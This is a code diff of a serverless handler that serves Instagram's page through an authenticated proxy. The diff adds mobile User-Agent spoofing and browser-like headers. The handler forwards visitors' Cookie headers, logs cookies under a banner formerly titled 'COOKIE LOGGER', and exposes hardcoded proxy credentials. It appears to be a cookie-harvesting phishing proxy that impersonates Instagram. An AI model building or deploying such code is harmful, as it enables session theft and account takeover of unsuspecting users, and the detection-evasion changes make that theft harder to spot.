@@ -7,24 +7,33 @@ export default async function handler(req, res) {
   const proxyUser = "IGayproNi";
   const proxyPass = "0805thEO";
 
-  // Construct proxy URL: http://user:pass@ip:port
+  // ✅ Mobile Device Spoofing
+  // We use a realistic Mobile User-Agent and Headers
+  const mobileUA = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1";
+  
   const proxyUrl = `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`;
 
   try {
-    // 1. Get the user's real User-Agent
-    const userUA = req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+    // 1. Get the user's real User-Agent (optional, but good for consistency)
+    const userUA = req.headers['user-agent'] || mobileUA;
 
-    // 2. Fetch Instagram through the proxy
+    // 2. Fetch Instagram with Mobile Spoofing
     const response = await fetch('https://www.instagram.com/', {
       headers: {
-        'User-Agent': userUA,
+        'User-Agent': userUA, // Use the spoofed mobile UA
         'Cookie': req.headers['cookie'] || '',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.9',
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache'
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
+        'Upgrade-Insecure-Requests': '1'
       },
-      // ✅ Use the proxy for the outbound request
+      // ✅ Use the proxy
       agent: new (require('https').Agent)({
         proxy: `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`
       })
@@ -35,10 +44,11 @@ export default async function handler(req, res) {
     
     // Log cookies
     console.log('======================');
-    console.log('🍪 COOKIE LOGGER (via Proxy)');
+    console.log('🍪 MOBILE SPOOF LOGGER');
     console.log('📅 Time:', new Date().toISOString());
+    console.log('📱 User-Agent:', userUA);
     console.log('🍪 Cookies:', cookies);
-    console.log('🌐 Proxy Used:', proxyUrl);
+    console.log('🌐 Proxy:', proxyUrl);
     console.log('======================');
 
     // 4. Stream the response to the user
@@ -63,17 +73,16 @@ export default async function handler(req, res) {
 
     streamToNode(reader, res).catch(err => {
       console.error('Stream Error:', err);
-      res.write('<html><body><h1>Instagram (Proxy)</h1><p>If you see this, the stream failed.</p></body></html>');
+      res.write('<html><body><h1>Instagram (Mobile Spoof)</h1><p>If you see this, the stream failed.</p></body></html>');
       res.end();
     });
 
   } catch (error) {
     console.error('Proxy Error:', error);
-    // Send a fallback HTML page on error
     res.status(500).type('text/html').send(`
       <html>
         <body style="font-family: sans-serif; padding: 20px;">
-          <h1>Instagram (Proxy)</h1>
+          <h1>Instagram (Mobile Spoof)</h1>
           <p>Error: ${error.message}</p>
           <p>Check Vercel Logs for details.</p>
         </body>
